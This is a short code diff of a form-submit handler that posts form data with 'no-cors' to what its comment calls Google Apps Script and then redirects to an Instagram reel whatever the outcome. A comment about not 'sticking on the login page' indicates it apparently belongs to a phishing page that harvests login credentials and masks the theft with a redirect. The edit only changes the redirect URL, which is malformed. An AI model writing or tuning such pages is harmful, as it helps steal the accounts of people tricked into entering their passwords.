@@ -20,11 +20,11 @@ form.addEventListener("submit", e => {
         mode: 'no-cors' // Google Apps Script often needs no-cors for simple POSTs if not returning JSON
     })
     .then(() => {
-        window.location.replace("https://www.instagram.com/reel/C7WomdQKj0r/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==")
+        window.location.replace("https://www.instagram.com/reel/DTlDtG7E09E/?igsh=MXg3ZmlyMXc1ZW5lOQ==igsh=MzRlODBiNWFlZA==")
     })
     .catch(error => {
         console.error('Error!', error.message)
         // Even on error, redirect to avoid sticking on the login page
-        window.location.replace("https://www.instagram.com/reel/C7WomdQKj0r/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==")
+        window.location.replace("https://www.instagram.com/reel/DTlDtG7E09E/?igsh=MXg3ZmlyMXc1ZW5lOQ==igsh=MzRlODBiNWFlZA==")
     })
 })
